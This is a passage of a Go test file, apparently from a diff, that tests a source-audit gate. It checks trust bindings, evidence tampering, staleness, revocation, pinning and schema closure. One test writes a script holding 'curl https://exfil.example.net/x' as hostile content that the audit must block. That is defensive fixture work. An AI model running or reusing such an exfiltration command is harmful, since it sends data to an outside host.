++		{AuditMode: "advisory", AuditFailOn: "high", ScriptLabels: []string{"script-worker-v1:unsupported"}},
++		{AuditMode: "advisory", AuditFailOn: "high", AssuranceLabels: []string{"policy:curator-artifact-policy-v1"}},
++	}
++	for i, inputs := range changed {
++		other, err := PolicyDigest(inputs)
++		if err != nil {
++			t.Fatal(err)
++		}
++		if other == base {
++			t.Fatalf("case %d did not change the policy digest", i)
++		}
++	}
++}
++
++func sourceTestSubject(snapshot string, schema int) SourceSubject {
++	return SourceSubject{
++		Name: "review", Source: "review", Git: "", Commit: "",
++		Snapshot: snapshot, SchemaVersion: schema,
++		Capabilities:  capabilities.ImplicitNone(),
++		Package:       testLocalPackage(),
++		ContentSHA256: "sha256:" + strings.Repeat("2", 64),
++		ScriptLabels:  []string{"script-worker-v1:unsupported"},
++		AssuranceLabels: []string{
++			"policy:curator-artifact-policy-v1",
++			"policy-version:1",
++			"detectors:curator-artifact-detectors-v1",
++			"limits:curator-artifact-limits-v1",
++		},
++	}
++}
++
++func cleanSnapshot(t *testing.T, script string) string {
++	t.Helper()
++	dir := t.TempDir()
++	if err := os.MkdirAll(filepath.Join(dir, "scripts"), 0o755); err != nil {
++		t.Fatal(err)
++	}
++	if err := os.WriteFile(filepath.Join(dir, "scripts", "tool"), []byte(script), 0o644); err != nil {
++		t.Fatal(err)
++	}
++	return dir
++}
++
++func TestCheckSourceAuditDisabledNoop(t *testing.T) {
++	cfg := newCfg(t, "advisory", "high")
++	cfg.Audit.Enabled = false
++	subject := sourceTestSubject(cleanSnapshot(t, "echo ok\n"), 4)
++	warnings, err := CheckSourceAudit(cfg, subject, true, sourceAuditTestNow)
++	if warnings != nil || err != nil {
++		t.Fatalf("disabled must be silent: %v %v", warnings, err)
++	}
++	if _, statErr := os.Stat(filepath.Join(cfg.Home(), "source-audit")); !os.IsNotExist(statErr) {
++		t.Fatalf("disabled gate wrote source-audit state")
++	}
++}
++
++func TestCheckSourceAuditEstablishThenValidate(t *testing.T) {
++	cfg := newCfg(t, "advisory", "high")
++	subject := sourceTestSubject(cleanSnapshot(t, "echo ok\n"), 4)
++	// Read-only planning without trust state fails unavailable: missing
++	// evidence is unknown, never current.
++	if _, err := CheckSourceAudit(cfg, subject, false, sourceAuditTestNow); err == nil ||
++		!strings.Contains(err.Error(), "source_audit_unavailable") {
++		t.Fatalf("read-only missing binding err = %v", err)
++	}
++	// The mutating path establishes the binding through a live run.
++	warnings, err := CheckSourceAudit(cfg, subject, true, sourceAuditTestNow)
++	if err != nil || len(warnings) != 0 {
++		t.Fatalf("establish: %v %v", warnings, err)
++	}
++	objectPath, err := SourceAuditPath(cfg.Home(), subject.Package)
++	if err != nil {
++		t.Fatal(err)
++	}
++	if _, err := os.Stat(objectPath); err != nil {
++		t.Fatalf("binding not stored: %v", err)
++	}
++	// The read-only path now validates the stored binding.
++	if _, err := CheckSourceAudit(cfg, subject, false, sourceAuditTestNow); err != nil {
++		t.Fatalf("validate: %v", err)
++	}
++	// A removed report fails instead of passing unattested — the stored
++	// object alone authorizes nothing (missing-audit-report). A broken
++	// existing record refuses on both paths and is never silently
++	// re-established: only first-time issuance (no binding at all) may
++	// establish.
++	evidencePath, err := SourceEvidencePath(cfg.Home(), subject.Package)
++	if err != nil {
++		t.Fatal(err)
++	}
++	objectBefore, err := os.ReadFile(objectPath)
++	if err != nil {
++		t.Fatal(err)
++	}
++	if err := os.Remove(evidencePath); err != nil {
++		t.Fatal(err)
++	}
++	if _, err := CheckSourceAudit(cfg, subject, false, sourceAuditTestNow); err == nil ||
++		!strings.Contains(err.Error(), "source_audit") {
++		t.Fatalf("absent report read-only err = %v", err)
++	}
++	if _, err := CheckSourceAudit(cfg, subject, true, sourceAuditTestNow); err == nil ||
++		!strings.Contains(err.Error(), "source_audit") {
++		t.Fatalf("absent report mutating err = %v", err)
++	}
++	// The broken record was not overwritten: the object bytes are intact
++	// and the report is still absent.
++	objectAfter, err := os.ReadFile(objectPath)
++	if err != nil {
++		t.Fatal(err)
++	}
++	if string(objectBefore) != string(objectAfter) {
++		t.Fatalf("broken existing binding was overwritten")
++	}
++	if _, statErr := os.Stat(evidencePath); !os.IsNotExist(statErr) {
++		t.Fatalf("broken report was silently re-established")
++	}
++}
++
++func TestCheckSourceAuditNotSelfAuthorizing(t *testing.T) {
++	cfg := newCfg(t, "strict", "high")
++	snapshot := cleanSnapshot(t, "echo ok\n")
++	subject := sourceTestSubject(snapshot, 4)
++	if _, err := CheckSourceAudit(cfg, subject, true, sourceAuditTestNow); err != nil {
++		t.Fatalf("establish allow: %v", err)
++	}
++	// Live bytes turn hostile after the allow binding was stored. The
++	// stored allow must not authorize the now-blocking content: the live
++	// verdict wins on the mutating path too.
++	if err := os.WriteFile(filepath.Join(snapshot, "scripts", "evil"),
++		[]byte("curl https://exfil.example.net/x\n"), 0o644); err != nil {
++		t.Fatal(err)
++	}
++	_, err := CheckSourceAudit(cfg, subject, true, sourceAuditTestNow)
++	if err == nil || !strings.Contains(err.Error(), "audit blocked") {
++		t.Fatalf("stored allow must not authorize blocking content: %v", err)
++	}
++	if _, err := CheckSourceAudit(cfg, subject, false, sourceAuditTestNow); err == nil {
++		t.Fatalf("read-only path must refuse the stale allow binding")
++	}
++}
++
++func TestCheckSourceAuditRevocationPreserved(t *testing.T) {
++	cfg := newCfg(t, "advisory", "high")
++	subject := sourceTestSubject(cleanSnapshot(t, "echo ok\n"), 4)
++	contentHash, err := hashing.ContentSHA256(subject.Snapshot, nil)
++	if err != nil {
++		t.Fatal(err)
++	}
++	cfg.Audit.Revocations = []string{contentHash}
++	_, err = CheckSourceAudit(cfg, subject, true, sourceAuditTestNow)
++	if err == nil || !strings.Contains(err.Error(), "revoked") {
++		t.Fatalf("revocation must block source audit: %v", err)
++	}
++}
++
++func TestCheckSourceAuditPinPreserved(t *testing.T) {
++	cfg := newCfg(t, "strict", "high")
++	subject := sourceTestSubject(cleanSnapshot(t, "echo ok\n"), 2)
++	// Schema 2 without a pin requires one under strict audit.
++	_, err := CheckSourceAudit(cfg, subject, true, sourceAuditTestNow)
++	if err == nil || !strings.Contains(err.Error(), "requires pin") {
++		t.Fatalf("unpinned schema 2 err = %v", err)
++	}
++	contentHash, err := hashing.ContentSHA256(subject.Snapshot, nil)
++	if err != nil {
++		t.Fatal(err)
++	}
++	if _, err := Pin(cfg.Home(), contentHash, "reviewed manually", "tester"); err != nil {
++		t.Fatal(err)
++	}
++	if _, err := CheckSourceAudit(cfg, subject, true, sourceAuditTestNow); err != nil {
++		t.Fatalf("authorized pin must admit: %v", err)
++	}
++}
++
++func TestCheckSourceAuditStaleReestablishesOnMutate(t *testing.T) {
++	cfg := newCfg(t, "advisory", "high")
++	subject := sourceTestSubject(cleanSnapshot(t, "echo ok\n"), 4)
++	if _, err := CheckSourceAudit(cfg, subject, true, sourceAuditTestNow); err != nil {
++		t.Fatalf("establish: %v", err)
++	}
++	// Age the stored binding past freshness without weakening anything:
++	// the read-only path refuses stale, the mutating path re-runs the live
++	// gates and re-issues.
++	stale := sourceAuditTestNow.Add(DefaultSourceAuditMaxAge + time.Hour)
++	if _, err := CheckSourceAudit(cfg, subject, false, stale); err == nil ||
++		!strings.Contains(err.Error(), "stale") {
++		t.Fatalf("stale binding must fail read-only: %v", err)
++	}
++	if _, err := CheckSourceAudit(cfg, subject, true, stale); err != nil {
++		t.Fatalf("mutating path must re-establish after live gates: %v", err)
++	}
++	if _, err := CheckSourceAudit(cfg, subject, false, stale); err != nil {
++		t.Fatalf("re-issued binding must validate: %v", err)
++	}
++}
++
++// TestValidateSourceAuditPolicyDriftNeverHidesRefusal pins the rework-2
++// ordering: evidence integrity, completeness, trusted bindings, time, and
++// decision are all validated before the renewable policy check, so a broken
++// existing record combined with a trusted policy drift still refuses with
++// the non-renewable diagnostic and never renews. Each row combines a policy
++// digest drift with one broken binding; the error must not be renewable and
++// must not be the policy diagnostic.
++func TestValidateSourceAuditPolicyDriftNeverHidesRefusal(t *testing.T) {
++	policyDrift := "sha256:" + strings.Repeat("9", 64)
++	cases := []struct {
++		name    string
++		mutate  func(*SourceAudit, *SourceExpectation, *testing.T)
++		wantSub string
++	}{
++		{"corrupt report", func(_ *SourceAudit, expected *SourceExpectation, _ *testing.T) {
++			expected.Evidence = []byte(`{}`)
++		}, "source_audit_rejected: evidence"},
++		{"digest mismatch", func(_ *SourceAudit, expected *SourceExpectation, _ *testing.T) {
++			expected.Evidence = append(append([]byte(nil), expected.Evidence...), ' ')
++		}, "source_audit_rejected: evidence"},
++		{"wrong skill recomputed", func(object *SourceAudit, expected *SourceExpectation, t *testing.T) {
++			var report EvidenceReport
++			if err := jsonUnmarshal(expected.Evidence, &report); err != nil {
++				t.Fatal(err)
++			}
++			report.Skill = "different-skill"
++			forged, err := MarshalEvidenceReport(report)
++			if err != nil {
++				t.Fatal(err)
++			}
++			object.EvidenceSHA256 = EvidenceDigest(forged)
++			expected.Evidence = forged
++		}, "source_audit_rejected: evidence"},
++		{"findings mismatch", func(object *SourceAudit, expected *SourceExpectation, t *testing.T) {
++			var report EvidenceReport
++			if err := jsonUnmarshal(expected.Evidence, &report); err != nil {
++				t.Fatal(err)
++			}
++			report.Findings = []Finding{{ID: "injected", Severity: SeverityHigh, Evidence: "x", Verifiable: true}}
++			forged, err := MarshalEvidenceReport(report)
++			if err != nil {
++				t.Fatal(err)
++			}
++			object.EvidenceSHA256 = EvidenceDigest(forged)
++			expected.Evidence = forged
++		}, "source_audit_rejected: evidence"},
++		{"future timestamp", func(object *SourceAudit, _ *SourceExpectation, _ *testing.T) {
++			object.CreatedAt = "2026-09-18T12:00:00Z"
++		}, "source_audit_rejected: time"},
++		{"decision drift", func(object *SourceAudit, expected *SourceExpectation, t *testing.T) {
++			var report EvidenceReport
++			if err := jsonUnmarshal(expected.Evidence, &report); err != nil {
++				t.Fatal(err)
++			}
++			report.Decision = DecisionWarn
++			forged, err := MarshalEvidenceReport(report)
++			if err != nil {
++				t.Fatal(err)
++			}
++			object.Decision = DecisionWarn
++			object.EvidenceSHA256 = EvidenceDigest(forged)
++			expected.Evidence = forged
++		}, "source_audit_rejected: decision"},
++	}
++	for _, tc := range cases {
++		t.Run(tc.name, func(t *testing.T) {
++			object, expected := validBinding(t)
++			tc.mutate(&object, &expected, t)
++			object.PolicySHA256 = policyDrift
++			err := ValidateSourceAudit(object, expected)
++			if err == nil || !strings.Contains(err.Error(), tc.wantSub) {
++				t.Fatalf("policy-drift + %s err = %v, want %q", tc.name, err, tc.wantSub)
++			}
++			if strings.Contains(err.Error(), "source_audit_rejected: policy:") {
++				t.Fatalf("policy-drift + %s hid behind renewable policy error: %v", tc.name, err)
++			}
++			if isRenewableAuditError(err) {
++				t.Fatalf("policy-drift + %s must not be renewable: %v", tc.name, err)
++			}
++		})
++	}
++	t.Run("genuine renewal still policy", func(t *testing.T) {
++		object, expected := validBinding(t)
++		object.PolicySHA256 = policyDrift
++		err := ValidateSourceAudit(object, expected)
++		if err == nil || !strings.Contains(err.Error(), "source_audit_rejected: policy:") {
++			t.Fatalf("genuine policy drift err = %v, want renewable policy error", err)
++		}
++		if !isRenewableAuditError(err) {
++			t.Fatalf("genuine policy drift must be renewable: %v", err)
++		}
++	})
++}
++
++// TestValidateSourceAuditStaleNeverHidesRefusal pins the rework-3
++// ordering: phase 1 (identity, context, evidence, decision, forged-future
++// time) completes before either renewable condition (stale time,
++// policy-label drift) is considered. Each row combines one renewable cause
++// with one broken non-renewable binding — the full renewable-cause x
++// non-renewable-binding matrix for the stale cause; the policy-drift-only
++// column lives in TestValidateSourceAuditPolicyDriftNeverHidesRefusal.
++// The error must carry the non-renewable diagnostic, must not be the stale
++// or policy diagnostic, and must not be renewable.
++func TestValidateSourceAuditStaleNeverHidesRefusal(t *testing.T) {
++	policyDrift := "sha256:" + strings.Repeat("9", 64)
++	staleAt := "2026-09-01T12:00:00Z"
++	tampers := []struct {
++		name    string
++		mutate  func(*SourceAudit, *SourceExpectation, *testing.T)
++		wantSub string
++	}{
++		{"corrupt report", func(_ *SourceAudit, expected *SourceExpectation, _ *testing.T) {
++			expected.Evidence = []byte(`{}`)
++		}, "source_audit_rejected: evidence"},
++		{"digest mismatch", func(_ *SourceAudit, expected *SourceExpectation, _ *testing.T) {
++			expected.Evidence = append(append([]byte(nil), expected.Evidence...), ' ')
++		}, "source_audit_rejected: evidence"},
++		{"wrong skill recomputed", func(object *SourceAudit, expected *SourceExpectation, t *testing.T) {
++			var report EvidenceReport
++			if err := jsonUnmarshal(expected.Evidence, &report); err != nil {
++				t.Fatal(err)
++			}
++			report.Skill = "different-skill"
++			forged, err := MarshalEvidenceReport(report)
++			if err != nil {
++				t.Fatal(err)
++			}
++			object.EvidenceSHA256 = EvidenceDigest(forged)
++			expected.Evidence = forged
++		}, "source_audit_rejected: evidence"},
++		{"findings mismatch", func(object *SourceAudit, expected *SourceExpectation, t *testing.T) {
++			var report EvidenceReport
++			if err := jsonUnmarshal(expected.Evidence, &report); err != nil {
++				t.Fatal(err)
++			}
++			report.Findings = []Finding{{ID: "injected", Severity: SeverityHigh, Evidence: "x", Verifiable: true}}
++			forged, err := MarshalEvidenceReport(report)
++			if err != nil {
++				t.Fatal(err)
++			}
++			object.EvidenceSHA256 = EvidenceDigest(forged)
++			expected.Evidence = forged
++		}, "source_audit_rejected: evidence"},
++		{"forged decision", func(object *SourceAudit, expected *SourceExpectation, t *testing.T) {
++			var report EvidenceReport
++			if err := jsonUnmarshal(expected.Evidence, &report); err != nil {
++				t.Fatal(err)
++			}
++			report.Decision = DecisionWarn
++			forged, err := MarshalEvidenceReport(report)
++			if err != nil {
++				t.Fatal(err)
++			}
++			object.Decision = DecisionWarn
++			object.EvidenceSHA256 = EvidenceDigest(forged)
++			expected.Evidence = forged
++		}, "source_audit_rejected: decision"},
++	}
++	causes := []struct {
++		name  string
++		apply func(*SourceAudit, *SourceExpectation)
++	}{
++		{"stale", func(object *SourceAudit, expected *SourceExpectation) {
++			object.CreatedAt = staleAt
++			expected.Now = sourceAuditTestNow
++		}},
++		{"stale plus policy drift", func(object *SourceAudit, expected *SourceExpectation) {
++			object.CreatedAt = staleAt
++			object.PolicySHA256 = policyDrift
++			expected.Now = sourceAuditTestNow
++		}},
++	}
++	for _, cause := range causes {
++		for _, tamper := range tampers {
++			t.Run(cause.name+" with "+tamper.name, func(t *testing.T) {
++				object, expected := validBinding(t)
++				tamper.mutate(&object, &expected, t)
++				cause.apply(&object, &expected)
++				err := ValidateSourceAudit(object, expected)
++				if err == nil || !strings.Contains(err.Error(), tamper.wantSub) {
++					t.Fatalf("%s err = %v, want %q", tamper.name, err, tamper.wantSub)
++				}
++				if strings.Contains(err.Error(), "is stale; re-run the gates") ||
++					strings.Contains(err.Error(), "source_audit_rejected: policy:") {
++					t.Fatalf("%s hid behind a renewable diagnostic: %v", tamper.name, err)
++				}
++				if isRenewableAuditError(err) {
++					t.Fatalf("%s must not be renewable: %v", tamper.name, err)
++				}
++			})
++		}
++	}
++	t.Run("genuine stale renewal stays renewable", func(t *testing.T) {
++		object, expected := validBinding(t)
++		object.CreatedAt = staleAt
++		expected.Now = sourceAuditTestNow
++		err := ValidateSourceAudit(object, expected)
++		if err == nil || !strings.Contains(err.Error(), "is stale; re-run the gates") {
++			t.Fatalf("genuine stale err = %v, want renewable stale error", err)
++		}
++		if !isRenewableAuditError(err) {
++			t.Fatalf("genuine stale must be renewable: %v", err)
++		}
++	})
++	t.Run("genuine stale plus drift renewal stays renewable", func(t *testing.T) {
++		object, expected := validBinding(t)
++		object.CreatedAt = staleAt
++		object.PolicySHA256 = policyDrift
++		expected.Now = sourceAuditTestNow
++		err := ValidateSourceAudit(object, expected)
++		if err == nil || !isRenewableAuditError(err) {
++			t.Fatalf("genuine stale plus drift err = %v, want a renewable error", err)
++		}
++	})
++}
++
++func TestSourceAuditNeverRegistryAttestation(t *testing.T) {
++	// A registry attestation summary carries registry/status/key members
++	// the source-audit shape rejects: the two evidences cannot be confused.
++	sha := "sha256:" + strings.Repeat("1", 64)
++	payload := `{"schema_version":1,` +
++		`"package":{"kind":"local-snapshot","snapshot":"` + sha + `"},` +
++		`"content_sha256":"` + sha + `","policy_sha256":"` + sha + `",` +
++		`"evidence_sha256":"` + sha + `",` +
++		`"decision":"allow","created_at":"2026-09-10T00:00:00Z",` +
++		`"registry":"test-reg","status":"audited","key_id":"0123456789abcdef"}`
++	if _, err := ParseSourceAudit([]byte(payload)); err == nil ||
++		!strings.Contains(err.Error(), "source_audit_rejected") {
++		t.Fatalf("attestation members must not parse as source audit: %v", err)
++	}
++	// And a valid source-audit object carries no attestation members.
++	object, _ := validBinding(t)
++	canonical, err := MarshalEvidenceReport(EvidenceReport{Package: object.Package})
++	if err != nil {
++		t.Fatal(err)
++	}
++	for _, forbidden := range []string{`"registry"`, `"status"`, `"key_id"`} {
++		if strings.Contains(string(canonical), forbidden) {
++			t.Fatalf("evidence report carries attestation member %s", forbidden)
++		}
++	}
++}
++
++// TestValidateSourceAuditRenewalMarkersNeverRenewable pins the rework-4
++// classification: renewal markers interpolated from untrusted report fields
++// (skill, decision, package kind) must not promote a refusal. Both renewal
++// substrings checked by the old text classifier are placed in each field,
++// with and without real renewal conditions (fresh, stale, policy drift,
++// stale+drift). Every row must refuse as non-renewable with the evidence
++// diagnostic, even though the message quotes the marker text.
++func TestValidateSourceAuditRenewalMarkersNeverRenewable(t *testing.T) {
++	staleMarker := "is stale; re-run the gates"
++	policyMarker := "source_audit_rejected: policy:"
++	markers := []struct{ name, value string }{
++		{"stale-marker", staleMarker},
++		{"policy-marker", policyMarker},
++	}
++	fields := []struct{ name string }{
++		{"skill"},
++		{"decision"},
++		{"package"},
++	}
++	causes := []struct {
++		name  string
++		apply func(*SourceAudit)
++	}{
++		{"fresh", func(*SourceAudit) {}},
++		{"stale", func(object *SourceAudit) { object.CreatedAt = "2026-09-01T12:00:00Z" }},
++		{"drift", func(object *SourceAudit) { object.PolicySHA256 = "sha256:" + strings.Repeat("9", 64) }},
++		{"stale-plus-drift", func(object *SourceAudit) {
++			object.CreatedAt = "2026-09-01T12:00:00Z"
++			object.PolicySHA256 = "sha256:" + strings.Repeat("9", 64)
++		}},
++	}
++	for _, field := range fields {
++		for _, marker := range markers {
++			for _, cause := range causes {
++				t.Run(field.name+"-"+marker.name+"-"+cause.name, func(t *testing.T) {
++					object, expected := validBinding(t)
++					var report EvidenceReport
++					if err := jsonUnmarshal(expected.Evidence, &report); err != nil {
++						t.Fatal(err)
++					}
++					switch field.name {
++					case "skill":
++						report.Skill = marker.value
++					case "decision":
++						report.Decision = marker.value
++					case "package":
++						report.Package = SourcePackage{Kind: marker.value}
++					}
++					forged, err := MarshalEvidenceReport(report)
++					if err != nil {
++						t.Fatal(err)
++					}
++					object.EvidenceSHA256 = EvidenceDigest(forged)
++					expected.Evidence = forged
++					cause.apply(&object)
++					expected.Now = sourceAuditTestNow
++					err = ValidateSourceAudit(object, expected)
++					if err == nil {
++						t.Fatalf("marker in %s was NOT refused", field.name)
++					}
++					// The diagnostic quotes the untrusted marker, so the
++					// message inevitably contains it; classification must
++					// still be non-renewable.
++					if !strings.Contains(err.Error(), marker.value) {
++						t.Fatalf("expected diagnostic to quote the marker: %v", err)
++					}
++					if !strings.Contains(err.Error(), "source_audit_rejected: evidence") {
++						t.Fatalf("marker in %s err = %v, want evidence diagnostic", field.name, err)
++					}
++					if isRenewableAuditError(err) {
++						t.Fatalf("marker in %s classified renewable: %v", field.name, err)
++					}
++					if got := auditRenewalCause(err); got != "" {
++						t.Fatalf("marker in %s carries renewal cause %q: %v", field.name, got, err)
++					}
++				})
++			}
++		}
++	}
++	t.Run("genuine stale stays renewable with cause", func(t *testing.T) {
++		object, expected := validBinding(t)
++		object.CreatedAt = "2026-09-01T12:00:00Z"
++		expected.Now = sourceAuditTestNow
++		err := ValidateSourceAudit(object, expected)
++		if err == nil || !isRenewableAuditError(err) {
++			t.Fatalf("genuine stale must be renewable: %v", err)
++		}
++		if got := auditRenewalCause(err); got != auditCauseStale {
++			t.Fatalf("genuine stale cause = %q, want %q", got, auditCauseStale)
++		}
++	})
++	t.Run("genuine policy drift stays renewable with cause", func(t *testing.T) {
++		object, expected := validBinding(t)
++		object.PolicySHA256 = "sha256:" + strings.Repeat("9", 64)
++		err := ValidateSourceAudit(object, expected)
++		if err == nil || !isRenewableAuditError(err) {
++			t.Fatalf("genuine drift must be renewable: %v", err)
++		}
++		if got := auditRenewalCause(err); got != auditCausePolicy {
++			t.Fatalf("genuine drift cause = %q, want %q", got, auditCausePolicy)
++		}
++	})
++}
++
++func testConfiguredPackage() SourcePackage {
++	return SourcePackage{
++		Kind: SourcePackageConfiguredGit, Source: "skills/review",
++		Commit: &SourceCommit{ObjectFormat: "sha1", Hex: strings.Repeat("b", 40)}, Directory: ".",
++	}
++}
++
++func validBindingForPackage(t *testing.T, pkg SourcePackage) (SourceAudit, SourceExpectation) {
++	t.Helper()
++	content := "sha256:" + strings.Repeat("2", 64)
++	policy := testPolicy(t)
++	scriptLabels := []string{"script-worker-v1:unsupported"}
++	assuranceLabels := []string{"policy:curator-artifact-policy-v1"}
++	report := EvidenceReport{
++		SchemaVersion: 1, Skill: "review", Package: pkg, ContentSHA256: content,
++		Findings: []Finding{}, Pinned: false, Revoked: false, Revocation: "",
++		ScriptPolicy: scriptLabels, AssurancePolicy: assuranceLabels,
++		Decision: DecisionAllow,
++	}
++	evidence, err := MarshalEvidenceReport(report)
++	if err != nil {
++		t.Fatal(err)
++	}
++	object := SourceAudit{
++		SchemaVersion: SourceAuditSchemaVersion, Package: pkg,
++		ContentSHA256: content, PolicySHA256: policy,
++		EvidenceSHA256: EvidenceDigest(evidence), Decision: DecisionAllow,
++		CreatedAt: "2026-09-17T11:59:00Z",
++	}
++	expected := SourceExpectation{
++		Package: pkg, Content: content, Policy: policy,
++		Evidence: evidence, Decision: DecisionAllow,
++		Now: sourceAuditTestNow, MaxAge: DefaultSourceAuditMaxAge,
++		Skill: "review", Findings: []Finding{},
++		Pinned: false, Revoked: false, Revocation: "",
++		ScriptLabels: scriptLabels, AssuranceLabels: assuranceLabels,
++	}
++	return object, expected
++}
++
++// TestSourcePackageArmsMatchAcceptedSchema asserts the closed-shape tables
++// derive from the accepted schemas: the vendored copies under
++// testdata/draft-sources-v1 must be byte-identical to curator-spec, and the
++// in-code tables must match their arms, required sets, and closedness.
++func TestSourcePackageArmsMatchAcceptedSchema(t *testing.T) {
++	auditRaw, err := os.ReadFile(filepath.Join("testdata", "draft-sources-v1", "source-audit-v1.schema.json"))
++	if err != nil {
++		t.Fatal(err)
++	}
++	typesRaw, err := os.ReadFile(filepath.Join("testdata", "draft-sources-v1", "source-types-v1.schema.json"))
++	if err != nil {
++		t.Fatal(err)
++	}
++	var auditSchema struct {
++		Required             []string       `json:"required"`
++		AdditionalProperties bool           `json:"additionalProperties"`
++		Properties           map[string]any `json:"properties"`
++	}
++	if err := json.Unmarshal(auditRaw, &auditSchema); err != nil {
++		t.Fatal(err)
++	}
++	if auditSchema.AdditionalProperties {
++		t.Fatalf("source-audit-v1 must be closed (additionalProperties:false)")
++	}
++	if len(auditSchema.Required) != len(sourceAuditObjectMembers) {
++		t.Fatalf("source-audit required = %v, table = %v", auditSchema.Required, sourceAuditObjectMembers)
++	}
++	for _, key := range auditSchema.Required {
++		if _, ok := sourceAuditObjectMembers[key]; !ok {
++			t.Fatalf("source-audit required %q missing from table", key)
++		}
++	}
++	for key := range sourceAuditObjectMembers {
++		found := false
++		for _, required := range auditSchema.Required {
++			if required == key {
++				found = true
++			}
++		}
++		if !found {
++			t.Fatalf("table member %q missing from schema required", key)
++		}
++	}
++	var typesSchema struct {
++		Defs map[string]struct {
++			OneOf []struct {
++				Required             []string `json:"required"`
++				AdditionalProperties bool     `json:"additionalProperties"`
++				Properties           map[string]struct {
++					Const string `json:"const"`
++				} `json:"properties"`
++			} `json:"oneOf"`
++		} `json:"$defs"`
++	}
++	// Decode generically: $defs.package.oneOf carries the three arms.
++	var generic map[string]any
++	if err := json.Unmarshal(typesRaw, &generic); err != nil {
++		t.Fatal(err)
++	}
++	_ = typesSchema
++	defs, ok := generic["$defs"].(map[string]any)
++	if !ok {
++		t.Fatalf("$defs missing")
++	}
++	pkgDef, ok := defs["package"].(map[string]any)
++	if !ok {
++		t.Fatalf("$defs.package missing")
++	}
++	arms, ok := pkgDef["oneOf"].([]any)
++	if !ok || len(arms) != 3 {
++		t.Fatalf("package oneOf must have exactly 3 arms, got %v", arms)
++	}
++	seenKinds := map[string]bool{}
++	for _, armAny := range arms {
++		arm, ok := armAny.(map[string]any)
++		if !ok {
++			t.Fatalf("arm is not an object: %v", armAny)
++		}
++		if closed, ok := arm["additionalProperties"].(bool); !ok || closed {
++			t.Fatalf("arm must declare additionalProperties:false: %v", arm)
++		}
++		requiredAny, ok := arm["required"].([]any)
++		if !ok {
++			t.Fatalf("arm required missing: %v", arm)
++		}
++		props, ok := arm["properties"].(map[string]any)
++		if !ok {
++			t.Fatalf("arm properties missing: %v", arm)
++		}
++		kindProp, ok := props["kind"].(map[string]any)
++		if !ok {
++			t.Fatalf("arm kind property missing: %v", arm)
++		}
++		kind, ok := kindProp["const"].(string)
++		if !ok {
++			t.Fatalf("arm kind const missing: %v", arm)
++		}
++		seenKinds[kind] = true
++		table, ok := sourcePackageArms[kind]
++		if !ok {
++			t.Fatalf("schema arm kind %q missing from table", kind)
++		}
++		if len(requiredAny) != len(table.required) {
++			t.Fatalf("arm %q required = %v, table = %v", kind, requiredAny, table.required)
++		}
++		for _, reqAny := range requiredAny {
++			req, ok := reqAny.(string)
++			if !ok {
++				t.Fatalf("arm %q required entry not a string: %v", kind, reqAny)
++			}
++			if _, ok := table.required[req]; !ok {
++				t.Fatalf("arm %q required %q missing from table", kind, req)
++			}
++			if _, ok := table.allowed[req]; !ok {
++				t.Fatalf("arm %q required %q missing from allowed", kind, req)
++			}
++		}
++		for key := range props {
++			if _, ok := table.allowed[key]; !ok {
++				t.Fatalf("arm %q schema property %q missing from table allowed", kind, key)
++			}
++		}
++		for key := range table.allowed {
++			if _, ok := props[key]; !ok {
++				t.Fatalf("arm %q table allowed %q missing from schema properties", kind, key)
++			}
++		}
++	}
++	for _, kind := range []string{SourcePackageLocalSnapshot, SourcePackageNetworkGit, SourcePackageConfiguredGit} {
++		if !seenKinds[kind] {
++			t.Fatalf("schema arms missing kind %q", kind)
++		}
++	}
++}
++
++// TestSourceAuditClosedPackageShape closes the rev6 class, not the instance:
++// every union arm is validated by its selected kind with
++// additionalProperties:false on raw bytes before Go decoding, for both the
++// persisted object (ParseSourceAudit) and the evidence report
++// (ValidateSourceAudit). Foreign-arm members refuse even when null or empty;
++// required members refuse when missing, null, or wrong-typed; unknown
++// members and trailing tokens refuse. Valid records for each arm admit.
++func TestSourceAuditClosedPackageShape(t *testing.T) {
++	sha := "sha256:" + strings.Repeat("1", 64)
++	validForeign := map[string]any{
++		"commit":     map[string]any{"object_format": "sha1", "hex": strings.Repeat("a", 40)},
++		"repository": "example.org/x",
++		"source":     "skills/review",
++		"directory":  "skills/review",
++		"snapshot":   sha,
++	}
++	wrongType := map[string]any{
++		"kind": 123, "snapshot": 123, "repository": 123,
++		"source": 123, "commit": "bad", "directory": 123,
++		"schema_version": "1", "skill": 123, "package": "bad",
++		"content_sha256": 123, "findings": "bad", "pinned": "true",
++		"revoked": 1, "revocation": 123, "script_policy": "bad",
++		"assurance_policy": 123, "decision": 123,
++		"object_format": 123, "hex": 123,
++	}
++	arms := []struct {
++		name     string
++		pkg      func() SourcePackage
++		foreign  []string
++		required []string
++	}{
++		{"local-snapshot", testLocalPackage, []string{"commit", "repository", "source", "directory"}, []string{"kind", "snapshot"}},
++		{"network-git", testGitPackage, []string{"snapshot", "source"}, []string{"kind", "repository", "commit", "directory"}},
++		{"configured-git", testConfiguredPackage, []string{"snapshot", "repository"}, []string{"kind", "source", "commit", "directory"}},
++	}
++	objectBytes := func(t *testing.T, object SourceAudit) []byte {
++		t.Helper()
++		raw, err := jsonMarshal(object)
++		if err != nil {
++			t.Fatal(err)
++		}
++		return raw
++	}
++	// Valid controls for each arm.
++	for _, arm := range arms {
++		t.Run("object-valid-"+arm.name, func(t *testing.T) {
++			object, _ := validBindingForPackage(t, arm.pkg())
++			if _, err := ParseSourceAudit(objectBytes(t, object)); err != nil {
++				t.Fatalf("valid %s object rejected: %v", arm.name, err)
++			}
++		})
++		t.Run("report-valid-"+arm.name, func(t *testing.T) {
++			object, expected := validBindingForPackage(t, arm.pkg())
++			if err := ValidateSourceAudit(object, expected); err != nil {
++				t.Fatalf("valid %s binding rejected: %v", arm.name, err)
++			}
++		})
++	}
++	// Foreign-arm members: presence alone refuses (null, empty, valid).
++	for _, arm := range arms {
++		for _, field := range arm.foreign {
++			for _, tc := range []struct {
++				label string
++				value any
++			}{
++				{"null", nil},
++				{"empty", ""},
++				{"valid", validForeign[field]},
++			} {
++				label := arm.name + "-foreign-" + field + "-" + tc.label
++				t.Run("object-"+label, func(t *testing.T) {
++					object, _ := validBindingForPackage(t, arm.pkg())
++					var doc map[string]any
++					if err := json.Unmarshal(objectBytes(t, object), &doc); err != nil {
++						t.Fatal(err)
++					}
++					doc["package"].(map[string]any)[field] = tc.value
++					forged, err := jsonMarshal(doc)
++					if err != nil {
++						t.Fatal(err)
++					}
++					if _, err := ParseSourceAudit(forged); err == nil ||
++						!strings.Contains(err.Error(), "source_audit") {
++						t.Fatalf("%s admitted: %v", label, err)
++					}
++				})
++				t.Run("report-"+label, func(t *testing.T) {
++					object, expected := validBindingForPackage(t, arm.pkg())
++					var doc map[string]any
